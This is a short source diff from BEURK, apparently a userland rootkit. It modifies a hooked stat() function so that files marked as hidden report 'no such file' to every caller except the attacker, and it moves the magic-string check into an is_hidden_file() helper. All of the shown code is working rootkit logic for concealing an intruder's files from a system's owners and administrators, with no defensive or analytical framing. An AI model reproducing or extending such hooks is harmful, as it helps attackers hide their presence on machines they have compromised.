@@ -18,11 +18,11 @@
  * along with BEURK.  If not, see <http://www.gnu.org/licenses/>.
  */
 
+#include <sys/stat.h> /* struct stat */
 #include <errno.h> /* errno, ENOENT */
-#include <string.h> /* strstr() */
-#include "beurk.h"
-#include "config.h"
-#include "hooks.h"
+#include "beurk.h" /* is_attacker(), is_hidden_file() */
+#include "config.h" /* REAL_STAT() */
+#include "hooks.h" /* prototype */
 
 int stat(const char *pathname, struct stat *buf) {
     DEBUG(D_INFO, "called stat(2) hook");
@@ -30,7 +30,7 @@ int stat(const char *pathname, struct stat *buf) {
     if (is_attacker())
         return (REAL_STAT(pathname, buf));
 
-    if (strstr(pathname, MAGIC_STRING)) {
+    if (is_hidden_file(pathname)) {
         errno = ENOENT;
         return (-1);
     }
